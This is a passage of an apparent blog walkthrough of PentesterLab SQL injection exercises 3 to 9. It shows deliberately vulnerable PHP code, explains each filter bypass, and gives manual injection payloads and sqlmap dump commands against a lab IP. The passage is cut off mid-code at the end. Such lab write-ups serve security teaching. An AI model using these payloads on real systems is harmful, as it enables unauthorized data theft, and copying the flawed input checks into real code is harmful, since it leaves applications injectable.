+<p><img src="http://wg135.github.io/images/blog/pentesterlab/web_for_pentester/sql/web_pentester_lab_sql3_manual.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>sqlmap exploit:</p>
+
+<p><code>sqlmap -u "http://192.168.79.162/sqli/example3.php?name=root" --dump --tamper=space2comment</code></p>
+
+<p>space2comment.py &mdash; Replaces space character (&lsquo; &rsquo;) with comments &lsquo;/**/&rsquo;</p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/web_for_pentester/sql/web_pentester_lab_sql3_sqlmap.JPG" title="[title sqlmap exploit [alt text]]" ></p>
+
+<h3>Example 4</h3>
+
+<p>code review:</p>
+
+<figure class='code'><figcaption><span>example4.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
+</span><span class='line'>  <span class="k">require_once</span><span class="p">(</span><span class="s1">&#39;../header.php&#39;</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">require_once</span><span class="p">(</span><span class="s1">&#39;db.php&#39;</span><span class="p">);</span>
+</span><span class='line'>  <span class="nv">$sql</span><span class="o">=</span><span class="s2">&quot;SELECT * FROM users where id=&quot;</span><span class="p">;</span>
+</span><span class='line'>  <span class="nv">$sql</span><span class="o">.=</span><span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;id&quot;</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot; &quot;</span><span class="p">;</span>
+</span><span class='line'>  <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+</span><span class='line'>  
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="cp">?&gt;</span><span class="x"></span>
+</span><span class='line'><span class="x">      &lt;table class=&#39;table table-striped&#39;&gt;</span>
+</span><span class='line'><span class="x">      &lt;tr&gt;&lt;th&gt;id&lt;/th&gt;&lt;th&gt;name&lt;/th&gt;&lt;th&gt;age&lt;/th&gt;&lt;/tr&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="x">      </span><span class="cp">&lt;?php</span>
+</span><span class='line'>      <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span> <span class="p">{</span>
+</span><span class='line'>          <span class="k">echo</span> <span class="s2">&quot;&lt;tr&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>              <span class="k">echo</span> <span class="s2">&quot;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>              <span class="k">echo</span> <span class="s2">&quot;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>              <span class="k">echo</span> <span class="s2">&quot;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;age&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>          <span class="k">echo</span> <span class="s2">&quot;&lt;/tr&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>      <span class="p">}</span>    
+</span><span class='line'>      <span class="k">echo</span> <span class="s2">&quot;&lt;/table&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>    <span class="k">require</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The developer use mysql_real_escape_string function to filter space. However, it cannot prevent sql injection without single quote.</p>
+
+<p>Manually exploit (encode id=2 or 1=1 )</p>
+
+<p><code>http://192.168.79.162/sqli/example4.php?id=2 or 1=1</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/web_for_pentester/sql/web_pentester_lab_sql4_manual.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>sqlmap exploit</p>
+
+<p><code>sqlmap -u "http://192.168.79.162/sqli/example4.php?id=2" --dump</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/web_for_pentester/sql/web_pentester_lab_sql4_sqlmap.JPG" title="[title sqlmap exploit [alt text]]" ></p>
+
+<h3>Example 5</h3>
+
+<p>code review:</p>
+
+<figure class='code'><figcaption><span>example5.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">require_once</span><span class="p">(</span><span class="s1">&#39;../header.php&#39;</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">require_once</span><span class="p">(</span><span class="s1">&#39;db.php&#39;</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/^[0-9]+/&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;id&quot;</span><span class="p">]))</span> <span class="p">{</span>
+</span><span class='line'>      <span class="k">die</span><span class="p">(</span><span class="s2">&quot;ERROR INTEGER REQUIRED&quot;</span><span class="p">);</span>   
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM users where id=&quot;</span><span class="p">;</span>
+</span><span class='line'>  <span class="nv">$sql</span> <span class="o">.=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;id&quot;</span><span class="p">]</span> <span class="p">;</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="cp">?&gt;</span><span class="x"></span>
+</span><span class='line'><span class="x">      &lt;table class=&#39;table table-striped&#39;&gt;</span>
+</span><span class='line'><span class="x">      &lt;tr&gt;&lt;th&gt;id&lt;/th&gt;&lt;th&gt;name&lt;/th&gt;&lt;th&gt;age&lt;/th&gt;&lt;/tr&gt;</span>
+</span><span class='line'><span class="x">      </span><span class="cp">&lt;?php</span>
+</span><span class='line'>      <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span> <span class="p">{</span>
+</span><span class='line'>          <span class="k">echo</span> <span class="s2">&quot;&lt;tr&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>              <span class="k">echo</span> <span class="s2">&quot;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>              <span class="k">echo</span> <span class="s2">&quot;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>              <span class="k">echo</span> <span class="s2">&quot;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;age&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>          <span class="k">echo</span> <span class="s2">&quot;&lt;/tr&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>      <span class="p">}</span>    
+</span><span class='line'>      <span class="k">echo</span> <span class="s2">&quot;&lt;/table&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>    <span class="k">require</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The developer use preg_match(&lsquo;/^[0-9]+/&rsquo;, $_GET[&ldquo;id&rdquo;]) to prevent SQL injection by using a regular expression. However, it only ensures that the parameter id starts with a digit.</p>
+
+<p>Manually exploit (encode id=2 or 1=1 #)</p>
+
+<p><code>http://192.168.79.162/sqli/example5.php?id=2 or 1=1 #</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/web_for_pentester/sql/web_pentester_lab_sql5_manual.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>sqlmap exploit</p>
+
+<p><code>sqlmap -u "http://192.168.79.162/sqli/example5.php?id=2" --dump</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/web_for_pentester/sql/web_pentester_lab_sql5_sqlmap.JPG" title="[title sqlmap exploit [alt text]]" ></p>
+
+<h3>Example 6</h3>
+
+<p>code review:</p>
+
+<figure class='code'><figcaption><span>example6.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
+</span><span class='line'>
+</span><span class='line'>   <span class="k">require_once</span><span class="p">(</span><span class="s1">&#39;../header.php&#39;</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">require_once</span><span class="p">(</span><span class="s1">&#39;db.php&#39;</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/[0-9]+$/&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;id&quot;</span><span class="p">]))</span> <span class="p">{</span>
+</span><span class='line'>      <span class="k">die</span><span class="p">(</span><span class="s2">&quot;ERROR INTEGER REQUIRED&quot;</span><span class="p">);</span>   
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM users where id=&quot;</span><span class="p">;</span>
+</span><span class='line'>  <span class="nv">$sql</span> <span class="o">.=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;id&quot;</span><span class="p">]</span> <span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  
+</span><span class='line'>  <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="cp">?&gt;</span><span class="x"></span>
+</span><span class='line'><span class="x">      &lt;table class=&#39;table table-striped&#39;&gt;</span>
+</span><span class='line'><span class="x">      &lt;tr&gt;&lt;th&gt;id&lt;/th&gt;&lt;th&gt;name&lt;/th&gt;&lt;th&gt;age&lt;/th&gt;&lt;/tr&gt;</span>
+</span><span class='line'><span class="x">      </span><span class="cp">&lt;?php</span>
+</span><span class='line'>      <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span> <span class="p">{</span>
+</span><span class='line'>          <span class="k">echo</span> <span class="s2">&quot;&lt;tr&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>              <span class="k">echo</span> <span class="s2">&quot;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>              <span class="k">echo</span> <span class="s2">&quot;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>              <span class="k">echo</span> <span class="s2">&quot;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;age&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>          <span class="k">echo</span> <span class="s2">&quot;&lt;/tr&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>      <span class="p">}</span>    
+</span><span class='line'>      <span class="k">echo</span> <span class="s2">&quot;&lt;/table&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>    <span class="k">require</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This regular expression just ensure the <code>id</code> ends with a digit, it doesn&rsquo;t check the beginning of the <code>id</code>. So the poc in example 5 is also vaild in this situation.</p>
+
+<p>Manual exploit:</p>
+
+<p><code>http://192.168.79.162/sqli/example6.php?id=2%20or%201=1#</code></p>
+
+<h3>Example 7</h3>
+
+<p>code review:</p>
+
+<figure class='code'><figcaption><span>example7.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">require_once</span><span class="p">(</span><span class="s1">&#39;../header.php&#39;</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">require_once</span><span class="p">(</span><span class="s1">&#39;db.php&#39;</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/^-?[0-9]+$/m&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;id&quot;</span><span class="p">]))</span> <span class="p">{</span>
+</span><span class='line'>      <span class="k">die</span><span class="p">(</span><span class="s2">&quot;ERROR INTEGER REQUIRED&quot;</span><span class="p">);</span>   
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM users where id=&quot;</span><span class="p">;</span>
+</span><span class='line'>  <span class="nv">$sql</span> <span class="o">.=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;id&quot;</span><span class="p">];</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="cp">?&gt;</span><span class="x"></span>
+</span><span class='line'><span class="x">      &lt;table class=&#39;table table-striped&#39;&gt;</span>
+</span><span class='line'><span class="x">      &lt;tr&gt;&lt;th&gt;id&lt;/th&gt;&lt;th&gt;name&lt;/th&gt;&lt;th&gt;age&lt;/th&gt;&lt;/tr&gt;</span>
+</span><span class='line'><span class="x">      </span><span class="cp">&lt;?php</span>
+</span><span class='line'>      <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span> <span class="p">{</span>
+</span><span class='line'>          <span class="k">echo</span> <span class="s2">&quot;&lt;tr&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>              <span class="k">echo</span> <span class="s2">&quot;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>              <span class="k">echo</span> <span class="s2">&quot;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>              <span class="k">echo</span> <span class="s2">&quot;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;age&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>          <span class="k">echo</span> <span class="s2">&quot;&lt;/tr&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>      <span class="p">}</span>    
+</span><span class='line'>      <span class="k">echo</span> <span class="s2">&quot;&lt;/table&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>    <span class="k">require</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The regular expression checked both beginning and end of the input correctly. However, it contains the modifier <code>PCRE_MULTILINE (/m)</code>. It only vaildate that one of the lines is only containing an integer, and the following values will therefore be valid. So use encoded new line symbol will bypass this.</p>
+
+<p>Manual exploit:</p>
+
+<p><code>http://192.168.79.162/sqli/example7.php?id=2%0A or 1=1</code></p>
+
+<p>sqlmap exploit:</p>
+
+<p><code>sqlmap -u "http://192.168.79.162/sqli/example7.php?id=2%0a*" --dump</code></p>
+
+<h3>Example 8</h3>
+
+<p>code review:</p>
+
+<figure class='code'><figcaption><span>example8.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">require_once</span><span class="p">(</span><span class="s1">&#39;../header.php&#39;</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">require_once</span><span class="p">(</span><span class="s1">&#39;db.php&#39;</span><span class="p">);</span>
+</span><span class='line'>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM users ORDER BY `&quot;</span><span class="p">;</span>
+</span><span class='line'>  <span class="nv">$sql</span> <span class="o">.=</span> <span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;order&quot;</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;`&quot;</span><span class="p">;</span>
+</span><span class='line'>  <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span><span class="sb">``</span>
+</span><span class='line'>      <span class="cp">?&gt;</span><span class="x"></span>
+</span><span class='line'><span class="x">      &lt;table  class=&#39;table table-striped&#39;&gt;</span>
+</span><span class='line'><span class="x">      &lt;tr&gt;</span>
+</span><span class='line'><span class="x">          &lt;th&gt;&lt;a href=&quot;example8.php?order=id&quot;&gt;id&lt;/th&gt;</span>
+</span><span class='line'><span class="x">          &lt;th&gt;&lt;a href=&quot;example8.php?order=name&quot;&gt;name&lt;/th&gt;</span>
+</span><span class='line'><span class="x">          &lt;th&gt;&lt;a href=&quot;example8.php?order=age&quot;&gt;age&lt;/th&gt;</span>
+</span><span class='line'><span class="x">      &lt;/tr&gt;</span>
+</span><span class='line'><span class="x">      </span><span class="cp">&lt;?php</span>
+</span><span class='line'>      <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span> <span class="p">{</span>
+</span><span class='line'>          <span class="k">echo</span> <span class="s2">&quot;&lt;tr&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>              <span class="k">echo</span> <span class="s2">&quot;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>              <span class="k">echo</span> <span class="s2">&quot;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>              <span class="k">echo</span> <span class="s2">&quot;&lt;td&gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;age&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>          <span class="k">echo</span> <span class="s2">&quot;&lt;/tr&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>      <span class="p">}</span>    
+</span><span class='line'>      <span class="k">echo</span> <span class="s2">&quot;&lt;/table&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>    <span class="k">require</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>
+After reviewing the source code, I decided to inject payload into &ldquo;ORDER BY&rdquo; statement, using Time-based blind injection.</p>
+
+<p>Manual exploit (encode order=id`,(select sleep(10) from dual where database() like database())#):</p>
+
+<p><code>http://192.168.79.162/sqli/example8.php?order=id</code>,(select sleep(10) from dual where database() like database())#`</p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/web_for_pentester/sql/web_pentester_lab_sql8_manual.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>sqlmap exploit:</p>
+
+<p><code>sqlmap -u "http://192.168.79.162/sqli/example8.php?order=id%60" --dump</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/pentesterlab/web_for_pentester/sql/web_pentester_lab_sql8_sqlmap.JPG" title="[title sqlmap exploit [alt text]]" ></p>
+
+<h3>Example 9</h3>
+
+<p>code review:</p>
+
+<figure class='code'><figcaption><span>example9.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
+</span><span class='line'>  <span class="k">require_once</span><span class="p">(</span><span class="s1">&#39;../header.php&#39;</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">require_once</span><span class="p">(</span><span class="s1">&#39;db.php&#39;</span><span class="p">);</span>
+</span><span class='line'>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;SELECT * FROM users ORDER BY &quot;</span><span class="p">;</span>
+</span><span class='line'>  <span class="nv">$sql</span> <span class="o">.=</span> <span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;order&quot;</span><span class="p">]);</span>
+</span><span class='line'>  <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="cp">?&gt;</span><span class="x"></span>
+</span><span class='line'><span class="x">      &lt;table class=&#39;table table-striped&#39;&gt;</span>
+</span><span class='line'><span class="x">      &lt;tr&gt;</span>
+</span><span class='line'><span class="x">          &lt;th&gt;&lt;a href=&quot;example9.php?order=id&quot;&gt;id&lt;/th&gt;</span>
+</span><span class='line'><span class="x">          &lt;th&gt;&lt;a href=&quot;example9.php?order=name&quot;&gt;name&lt;/th&gt;</span>
+</span><span class='line'><span class="x">          &lt;th&gt;&lt;a href=&quot;example9.php?order=age&quot;&gt;age&lt;/th&gt;</span>
+</span><span class='line'><span class="x">      &lt;/tr&gt;</span>
+</span><span class='line'><span class="x">      </span><span class="cp">&lt;?php</span>
